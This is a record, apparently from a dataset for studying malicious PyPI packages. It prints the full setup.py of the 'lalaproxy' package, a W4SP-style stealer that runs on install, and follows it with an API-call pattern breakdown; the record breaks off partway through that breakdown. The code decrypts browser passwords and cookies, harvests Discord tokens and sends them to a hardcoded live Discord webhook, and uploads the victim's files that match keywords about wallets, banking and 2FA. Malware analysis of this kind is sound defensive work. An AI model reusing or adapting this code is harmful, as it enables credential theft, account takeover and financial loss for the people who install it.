[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/lalaproxy-1/lalaproxy-1/setup.py",
    "code_snippet": "import os\nimport sys\nimport subprocess\nimport threading\nimport time\nimport re\nimport json\nimport base64\nfrom base64 import b64decode\nfrom json import loads as json_loads\nfrom sys import executable\nfrom sqlite3 import connect as sql_connect\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom urllib.request import Request, urlopen\nfrom zipfile import ZipFile\n\n# Malicious webhook for exfiltration\nhook = \"https://discord.com/api/webhooks/1081482489505267813/mgDR662Olzc8niRcWFZNhBpSd3fdQ9XvmXt_xDhPm0tMMbYug2oZWRreHpuoLuiovqSq\"\n\n# Helper to get public IP\n\ndef getip():\n    ip = \"None\"\n    try:\n        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n    except:\n        pass\n    return ip\n\n# Crypto helpers for decrypting browser data\nclass DATA_BLOB(Structure):\n    _fields_ = [\n        ('cbData', wintypes.DWORD),\n        ('pbData', POINTER(c_char))\n    ]\n\ndef GetData(blob_out):\n    cbData = int(blob_out.cbData)\n    pbData = blob_out.pbData\n    buffer = c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer, pbData, cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\n\ndef CryptUnprotectData(encrypted_bytes, entropy=b''):\n    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))\n    buffer_entropy = c_buffer(entropy, len(entropy))\n    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)\n    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)\n    blob_out = DATA_BLOB()\n    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):\n        return GetData(blob_out)\n\ndef DecryptValue(buff, master_key=None):\n    starts = buff.decode(encoding='utf8', errors='ignore')[:3]\n    if starts == 'v10' or starts == 'v11':\n        iv = buff[3:15]\n        payload = buff[15:]\n        from Crypto.Cipher import AES\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\n\n# Exfiltration via Discord webhook\n\ndef LoadUrlib(hook, data='', files='', headers=''):\n    for i in range(8):\n        try:\n            if headers != '':\n                r = urlopen(Request(hook, data=data, headers=headers))\n                return r\n            else:\n                r = urlopen(Request(hook, data=data))\n                return r\n        except: \n            pass\n\ndef globalInfo():\n    ip = getip()\n    username = os.getenv(\"USERNAME\")\n    ipdatanojson = urlopen(Request(f\"https://geolocation-db.com/jsonp/{ip}\")).read().decode().replace('callback(', '').replace('})', '}')\n    ipdata = json.loads(ipdatanojson)\n    contry = ipdata[\"country_name\"]\n    contryCode = ipdata[\"country_code\"].lower()\n    globalinfo = f\":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`\"\n    return globalinfo\n\n# Token exfiltration\n\ndef GetTokenInfo(token):\n    headers = {\n        \"Authorization\": token,\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    userjson = json.loads(urlopen(Request(\"https://discordapp.com/api/v6/users/@me\", headers=headers)).read().decode())\n    username = userjson[\"username\"]\n    hashtag = userjson[\"discriminator\"]\n    email = userjson[\"email\"]\n    idd = userjson[\"id\"]\n    pfp = userjson[\"avatar\"]\n    flags = userjson[\"public_flags\"]\n    nitro = \"\"\n    phone = \"-\"\n    if \"premium_type\" in userjson: \n        nitrot = userjson[\"premium_type\"]\n        if nitrot == 1:\n            nitro = \"<:classic:896119171019067423> \"\n        elif nitrot == 2:\n            nitro = \"<a:boost:824036778570416129> <:classic:896119171019067423> \"\n    if \"phone\" in userjson: phone = f'`{userjson[\"phone\"]}`'\n    return username, hashtag, email, idd, pfp, flags, nitro, phone\n\ndef checkToken(token):\n    headers = {\n        \"Authorization\": token,\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    try:\n        urlopen(Request(\"https://discordapp.com/api/v6/users/@me\", headers=headers))\n        return True\n    except:\n        return False\n\ndef uploadToken(token, path):\n    global hook\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)\n    if pfp == None: \n        pfp = \"https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png\"\n    else:\n        pfp = f\"https://cdn.discordapp.com/avatars/{idd}/{pfp}\"\n    billing = GetBilling(token)\n    badge = GetBadge(flags)\n    friends = GetUHQFriends(token)\n    if friends == '': friends = \"No Rare Friends\"\n    if not billing:\n        badge, phone, billing = \"ðŸ”’\", \"ðŸ”’\", \"ðŸ”’\"\n    if nitro == '' and badge == '': nitro = \" -\"\n    data = {\n        \"content\": f'{globalInfo()} | Found in `{path}`',\n        \"embeds\": [\n            {\n            \"color\": 14406413,\n            \"fields\": [\n                {\n                    \"name\": \":rocket: Token:\",\n                    \"value\": f\"`{token}`\\n[Click to copy](https://superfurrycdn.nl/copy/{token})\"\n                },\n                {\n                    \"name\": \":envelope: Email:\",\n                    \"value\": f\"`{email}`\",\n                    \"inline\": True\n                },\n                {\n                    \"name\": \":mobile_phone: Phone:\",\n                    \"value\": f\"{phone}\",\n                    \"inline\": True\n                },\n                {\n                    \"name\": \":globe_with_meridians: IP:\",\n                    \"value\": f\"`{getip()}`\",\n                    \"inline\": True\n                },\n                {\n                    \"name\": \":beginner: Badges:\",\n                    \"value\": f\"{nitro}{badge}\",\n                    \"inline\": True\n                },\n                {\n                    \"name\": \":credit_card: Billing:\",\n                    \"value\": f\"{billing}\",\n                    \"inline\": True\n                },\n                {\n                    \"name\": \":clown: HQ Friends:\",\n                    \"value\": f\"{friends}\",\n                    \"inline\": False\n                }\n                ],\n            \"author\": {\n                \"name\": f\"{username}#{hashtag} ({idd})\",\n                \"icon_url\": f\"{pfp}\"\n                },\n            \"footer\": {\n                \"text\": \"@W4SP STEALER\",\n                \"icon_url\": \"https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png\"\n                },\n            \"thumbnail\": {\n                \"url\": f\"{pfp}\"\n                }\n            }\n        ],\n        \"avatar_url\": \"https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png\",\n        \"username\": \"W4SP Stealer\",\n        \"attachments\": []\n        }\n    LoadUrlib(hook, data=json.dumps(data).encode(), headers=headers)\n\n# Browser data stealing (passwords, cookies, etc)\n\nPassw = []\ndef getPassw(path, arg):\n    global Passw, PasswCount\n    if not os.path.exists(path): return\n    pathC = path + arg + \"/Login Data\"\n    if os.stat(pathC).st_size == 0: return\n    tempfold = os.getenv(\"TEMP\") + \"wp\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = sql_connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data: \n        if row[0] != '':\n            Passw.append(f\"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}\")\n            PasswCount += 1\n    writeforfile(Passw, 'passw')\n\nCookies = []    \ndef getCookie(path, arg):\n    global Cookies, CookiCount\n    if not os.path.exists(path): return\n    pathC = path + arg + \"/Cookies\"\n    if os.stat(pathC).st_size == 0: return\n    tempfold = os.getenv(\"TEMP\") + \"wp\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = sql_connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data: \n        if row[0] != '':\n            Cookies.append(f\"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}\")\n            CookiCount += 1\n    writeforfile(Cookies, 'cook')\n\n# Discord token stealing\nTokens = ''\ndef getToken(path, arg):\n    if not os.path.exists(path): return\n    path += arg\n    for file in os.listdir(path):\n        if file.endswith(\".log\") or file.endswith(\".ldb\"):\n            for line in [x.strip() for x in open(f\"{path}\\\\{file}\", errors=\"ignore\").readlines() if x.strip()]:\n                for regex in (r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\", r\"mfa\\.[\\w-]{80,95}\"):\n                    for token in re.findall(regex, line):\n                        global Tokens\n                        if checkToken(token):\n                            if not token in Tokens:\n                                Tokens += token\n                                uploadToken(token, path)\n\ndef GetDiscord(path, arg):\n    if not os.path.exists(f\"{path}/Local State\"): return\n    pathC = path + arg\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for file in os.listdir(pathC):\n        if file.endswith(\".log\") or file.endswith(\".ldb\"):\n            for line in [x.strip() for x in open(f\"{pathC}\\\\{file}\", errors=\"ignore\").readlines() if x.strip()]:\n                for token in re.findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", line):\n                    global Tokens\n                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)\n                    if checkToken(tokenDecoded):\n                        if not tokenDecoded in Tokens:\n                            Tokens += tokenDecoded\n                            uploadToken(tokenDecoded, path)\n\n# File exfiltration via anonfiles\n\ndef uploadToAnonfiles(path):\n    try:\n        return requests.post(f'https://{requests.get(\"https://api.gofile.io/getServer\").json()[\"data\"][\"server\"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()[\"data\"][\"downloadPage\"]\n    except:\n        return False\n\n# File search and exfiltration from Desktop, Downloads, Documents\nKiwiFiles = []\ndef KiwiFile(path, keywords):\n    global KiwiFiles\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, uploadToAnonfiles(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    KiwiFolder(target, keywords)\n                    break\n    KiwiFiles.append([\"folder\", path, fifound])\n\ndef KiwiFolder(pathF, keywords):\n    global KiwiFiles\n    maxfilesperdir = 7\n    i = 0\n    listOfFile = os.listdir(pathF)\n    ffound = []\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file): return\n        i += 1\n        if i <= maxfilesperdir:\n            url = uploadToAnonfiles(pathF + \"/\" + file)\n            ffound.append([pathF + \"/\" + file, url])\n        else:\n            break\n    KiwiFiles.append([\"folder\", pathF + \"/\", ffound])\n\ndef Kiwi():\n    user = os.getenv(\"TEMP\").split(\"\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n    key_wordsFiles = [\n        \"passw\", \"mdp\", \"motdepasse\", \"mot_de_passe\", \"login\", \"secret\", \"account\", \"acount\", \"paypal\", \"banque\", \"account\", \"metamask\", \"wallet\", \"crypto\", \"exodus\", \"discord\", \"2fa\", \"code\", \"memo\", \"compte\", \"token\", \"backup\", \"secret\"\n    ]\n    wikith = []\n    for patt in path2search: \n        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()\n        wikith.append(kiwi)\n    return wikith\n\n# Main exfiltration logic\n\ndef GatherAll():\n    browserPaths = [\n        [f\"{os.getenv('APPDATA')}/Opera Software/Opera GX Stable\",               \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n        [f\"{os.getenv('APPDATA')}/Opera Software/Opera Stable\",                  \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n        [f\"{os.getenv('APPDATA')}/Opera Software/Opera Neon/User Data/Default\",  \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n        [f\"{os.getenv('LOCALAPPDATA')}/Google/Chrome/User Data\",                        \"chrome.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n        [f\"{os.getenv('LOCALAPPDATA')}/Google/Chrome SxS/User Data\",                    \"chrome.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n        [f\"{os.getenv('LOCALAPPDATA')}/BraveSoftware/Brave-Browser/User Data\",          \"brave.exe\",    \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n        [f\"{os.getenv('LOCALAPPDATA')}/Yandex/YandexBrowser/User Data\",                 \"yandex.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn\"                                    ],\n        [f\"{os.getenv('LOCALAPPDATA')}/Microsoft/Edge/User Data\",                       \"edge.exe\",     \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ]\n    ]\n    discordPaths = [\n        [f\"{os.getenv('APPDATA')}/Discord\", \"/Local Storage/leveldb\"],\n        [f\"{os.getenv('APPDATA')}/Lightcord\", \"/Local Storage/leveldb\"],\n        [f\"{os.getenv('APPDATA')}/discordcanary\", \"/Local Storage/leveldb\"],\n        [f\"{os.getenv('APPDATA')}/discordptb\", \"/Local Storage/leveldb\"],\n    ]\n    Threadlist = []\n    for patt in browserPaths: \n        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])\n        a.start()\n        Threadlist.append(a)\n    for patt in discordPaths: \n        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])\n        a.start()\n        Threadlist.append(a)\n    for patt in browserPaths: \n        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])\n        a.start()\n        Threadlist.append(a)\n    ThCokk = []\n    for patt in browserPaths: \n        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])\n        a.start()\n        ThCokk.append(a)\n    for thread in ThCokk: thread.join()\n    for thread in Threadlist: \n        thread.join()\n    wikith = Kiwi()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    filetext = \"\\n\"\n    for arg in KiwiFiles:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]       \n            filetext += f\"\\ud83d\\udcc1 {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"\\u2514\\u2014:open_file_folder: [{fileanme}]({b})\\n\"\n            filetext += \"\\n\"\n    upload(\"kiwi\", filetext)\n\n# Run the stealer logic on import\nGatherAll()\n",
    "pattern_analysis": {
      "api_sequence": [
        "os.getenv",
        "Request",
        "urlopen",
        "urlopen.read",
        "bytes.decode",
        "os.getenv",
        "os.path.exists",
        "os.stat",
        "os.getenv",
        "shutil.copy2",
        "sql_connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "sqlite3.Cursor.fetchall",
        "sqlite3.Cursor.close",
        "sqlite3.Connection.close",
        "os.remove",
        "open",
        "json_loads",
        "base64.b64decode",
        "CryptUnprotectData",
        "DecryptValue",
        "writeforfile",
        "os.getenv",
        "os.path.exists",
        "os.stat",
        "os.getenv",
        "shutil.copy2",
        "sql_connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "sqlite3.Cursor.fetchall",
        "sqlite3.Cursor.close",
        "sqlite3.Connection.close",
        "os.remove",
        "open",
        "json_loads",
        "base64.b64decode",
        "CryptUnprotectData",
        "DecryptValue",
        "writeforfile",
        "os.path.exists",
        "os.listdir",
        "open",
        "re.findall",
        "checkToken",
        "uploadToken",
        "os.path.exists",
        "open",
        "json_loads",
        "base64.b64decode",
        "CryptUnprotectData",
        "os.listdir",
        "open",
        "re.findall",
        "base64.b64decode",
        "DecryptValue",
        "checkToken",
        "uploadToken",
        "requests.get",
        "open",
        "requests.post",
        "os.listdir",
        "os.path.isfile",
        "uploadToAnonfiles",
        "os.path.isdir",
        "os.listdir",
        "os.path.isfile",
        "uploadToAnonfiles",
        "os.getenv",
        "threading.Thread",
        "threading.Thread.start",
        "threading.Thread.join",
        "time.sleep",
        "upload"
      ],
      "api_sequence_with_args": [
        "os.getenv(\"USERNAME\")",
        "Request(\"https://api.ipify.org\")",
        "urlopen(Request(\"https://api.ipify.org\"))",
        "urlopen(Request(\"https://api.ipify.org\")).read()",
        "urlopen(Request(\"https://api.ipify.org\")).read().decode()",
        "os.getenv(\"TEMP\")",
        "os.path.exists(path)",
        "os.stat(pathC)",
        "os.getenv(\"TEMP\")",
        "shutil.copy2(pathC, tempfold)",
        "sql_connect(tempfold)",
        "conn.cursor()",
        "cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")",
        "cursor.fetchall()",
        "cursor.close()",
        "conn.close()",
        "os.remove(tempfold)",
        "open(pathKey, 'r', encoding='utf-8')",
        "json_loads(f.read())",
        "base64.b64decode(local_state['os_crypt']['encrypted_key'])",
        "CryptUnprotectData(master_key[5:])",
        "DecryptValue(row[2], master_key)",
        "writeforfile(Passw, 'passw')",
        "os.getenv(\"TEMP\")",
        "os.path.exists(path)",
        "os.stat(pathC)",
        "os.getenv(\"TEMP\")",
        "shutil.copy2(pathC, tempfold)",
        "sql_connect(tempfold)",
        "conn.cursor()",
        "cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")",
        "cursor.fetchall()",
        "cursor.close()",
        "conn.close()",
        "os.remove(tempfold)",
        "open(pathKey, 'r', encoding='utf-8')",
        "json_loads(f.read())",
        "base64.b64decode(local_state['os_crypt']['encrypted_key'])",
        "CryptUnprotectData(master_key[5:])",
        "DecryptValue(row[2], master_key)",
        "writeforfile(Cookies, 'cook')",
        "os.path.exists(path)",
        "os.listdir(path)",
        "open(f\"{path}\\\\{file}\", errors=\"ignore\")",
        "re.findall(regex, line)",
        "checkToken(token)",
        "uploadToken(token, path)",
        "os.path.exists(f\"{path}/Local State\")",
        "open(pathKey, 'r', encoding='utf-8')",
        "json_loads(f.read())",
        "base64.b64decode(local_state['os_crypt']['encrypted_key'])",
        "CryptUnprotectData(master_key[5:])",
        "os.listdir(pathC)",
        "open(f\"{pathC}\\\\{file}\", errors=\"ignore\")",
        "re.findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", line)",
        "base64.b64decode(token.split('dQw4w9WgXcQ:')[1])",
        "DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)",
        "checkToken(tokenDecoded)",
        "uploadToken(tokenDecoded, path)",
        "requests.get(\"https://api.gofile.io/getServer\")",
        "open(path, 'rb')",
        "requests.post(f'https://{requests.get(...).json()[\"data\"][\"server\"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')})",
        "os.listdir(path)",
        "os.path.isfile(path + \"/\" + file)",
        "uploadToAnonfiles(path + \"/\" + file)",
        "os.path.isdir(path + \"/\" + file)",
        "os.listdir(pathF)",
        "os.path.isfile(pathF + \"/\" + file)",
        "uploadToAnonfiles(pathF + \"/\" + file)",
        "os.getenv(\"TEMP\")",
        "threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles])",
        "kiwi.start()",
        "thread.join()",
        "time.sleep(0.2)",
        "upload(\"kiwi\", filetext)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "urllib.request.Request",
          "id": "create_http_request",
          "description": "Creates HTTP request object with specified URL, data, and headers",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_get",
          "description": "Opens URL with GET parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "http.client.HTTPResponse.read",
          "id": "read_response_bytes",
          "description": "Reads response body as bytes",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "bytes.decode",
          "id": "decode_bytes_default",
          "description": "Decodes bytes using default codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.stat",
          "id": "path_object_operations",
          "description": "Path object and status operations (creating Path objects, retrieving file status)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "shutil.copy2",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "sqlite3.connect",
          "id": "open_sqlite_db",
          "description": "Opens SQLite database file",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.cursor",
          "id": "create_sql_cursor",
          "description": "Creates cursor object for SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.execute",
          "id": "execute_sql_query",
          "description": "Executes SQL query on SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.fetchall",
          "id": "fetch_sql_rows",
          "description": "Fetches all rows from last executed query",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.close",
          "id": "close_sqlite_connection",
          "description": "Closes the SQLite database connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.close",
          "id": "close_sqlite_connection",
          "description": "Closes the SQLite database connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "CryptUnprotectData",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "DecryptValue",
          "id": "decrypt_chrome_password",
          "description": "Decrypts Chrome password value",
          "first_id": "information_gathering",
          "second_id": "browser_data_theft",
          "third_id": "password_theft"
        },
        {
          "api_name": "writeforfile",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.stat",
          "id": "path_object_operations",
          "description": "Path object and status operations (creating Path objects, retrieving file status)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "shutil.copy2",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "sqlite3.connect",
          "id": "open_sqlite_db",
          "description": "Opens SQLite database file",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.cursor",
          "id": "create_sql_cursor",
          "description": "Creates cursor object for SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.execute",
          "id": "execute_sql_query",
          "description": "Executes SQL query on SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.fetchall",
          "id": "fetch_sql_rows",
          "description": "Fetches all rows from last executed query",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.close",
          "id": "close_sqlite_connection",
          "description": "Closes the SQLite database connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.close",
          "id": "close_sqlite_connection",
          "description": "Closes the SQLite database connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "CryptUnprotectData",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "DecryptValue",
          "id": "decrypt_chromium_cookies",
          "description": "Decrypts Chromium-based browser cookies for specified domain",
          "first_id": "information_gathering",
          "second_id": "browser_data_theft",
          "third_id": "cookie_theft"
        },
        {
          "api_name": "writeforfile",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
